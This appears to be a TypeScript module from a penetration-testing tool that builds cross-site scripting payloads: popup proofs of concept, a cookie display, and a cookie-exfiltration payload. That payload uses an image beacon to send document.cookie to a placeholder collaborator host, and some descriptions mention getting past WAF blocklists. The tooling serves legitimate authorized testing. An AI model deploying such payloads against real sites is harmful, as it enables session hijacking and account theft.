export type XssActionId = "alert" | "prompt" | "confirm" | "cookie-alert" | "cookie-exfil" | "custom";

export type XssAction = {
  id: XssActionId;
  label: string;
  description: string;
  build: (customInput: string) => string;
};

/** Obvious placeholder the user must swap for their own collaborator/webhook domain before
 *  the exfil payload can actually send anything anywhere. Pre-fills the editable domain field
 *  so it's ready to use as-is or overwrite. */
export const EXFIL_PLACEHOLDER_DOMAIN = "YOUR-COLLAB-SERVER.example";

export const XSS_ACTIONS: XssAction[] = [
  {
    id: "alert",
    label: "alert(1)",
    description: "The classic proof-of-concept — a visible popup confirms JavaScript executed in the page's context.",
    build: () => "alert(1)",
  },
  {
    id: "prompt",
    label: "prompt(1)",
    description: "Alternative popup-based POC — some WAFs and filters block the string \"alert\" specifically.",
    build: () => "prompt(1)",
  },
  {
    id: "confirm",
    label: "confirm(1)",
    description: "Another popup-based POC alternative, useful when both alert and prompt are blocklisted.",
    build: () => "confirm(1)",
  },
  {
    id: "cookie-alert",
    label: "document.cookie (show only)",
    description:
      "Displays the page's cookies in a popup without sending them anywhere — proves cookies are readable/injectable without any network call.",
    build: () => "alert(document.cookie)",
  },
  {
    id: "cookie-exfil",
    label: "document.cookie (exfiltrate)",
    description:
      "Sends the victim's cookies to an external listener via an image beacon. Edit the domain below to your own Burp Collaborator/webhook domain before use — only use against systems you're authorized to test.",
    build: (domain) => `new Image().src='//${domain || EXFIL_PLACEHOLDER_DOMAIN}/'+encodeURIComponent(document.cookie)`,
  },
  {
    id: "custom",
    label: "Custom",
    description: "Reflects whatever you type below, verbatim, in place of the JavaScript action.",
    build: (customInput) => customInput,
  },
];

export const XSS_ACTIONS_BY_ID: Record<XssActionId, XssAction> = Object.fromEntries(
  XSS_ACTIONS.map((action) => [action.id, action]),
) as Record<XssActionId, XssAction>;
